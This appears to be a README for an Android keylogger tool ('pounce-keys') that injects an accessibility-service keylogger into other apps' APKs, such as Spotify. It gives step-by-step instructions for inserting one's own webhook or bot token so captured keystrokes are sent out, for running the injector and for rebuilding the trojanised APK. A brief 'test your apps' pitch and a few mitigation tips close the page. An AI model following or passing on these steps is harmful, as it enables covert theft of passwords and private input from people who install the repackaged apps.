Inject.rar in the builders release section

injector does not work on all apps (works on spotify and a few more)

open the Source folder in VS code and search and replace all for 2 instances of "INSERT-WEBHOOK-URL-FROM-YOUR-CHANNEL-BOT" with your own bot token

run: python -m inject

place the apk you want to inject into the apk folder

click inject, wait for it to stop hanging, it's done when there exists text in the box

click on inject 

drag and drop the apk into the apktool gui's build tab and hope you win the lottery, if it builds then enable the service

[Old IP version notes](https://github.com/NullPounce/pounce-keys/wiki/Old-IP-version-notes)

# ARE YOU'RE APPS VULNERABLE? TEST THEM NOW! 
Use Pounce_keys in your dev workflow to assure your app is protected by keyloggers, this is a must for banking apps and yes some are vulnerable!
Example even CalyxOS lock-sceen is vulnerable, fennec's browser URL tab is protected but not web pages. Signal is even vulnerable!



# mitigations

can I protect my passwords from this, even while hacked?
Open dev options and under privacy turn off show passwords when typed.
don't use acceessibility services...

how do I look for this

CHECK
accessibility settings for any downloaded services or if any are on (name don't matter)
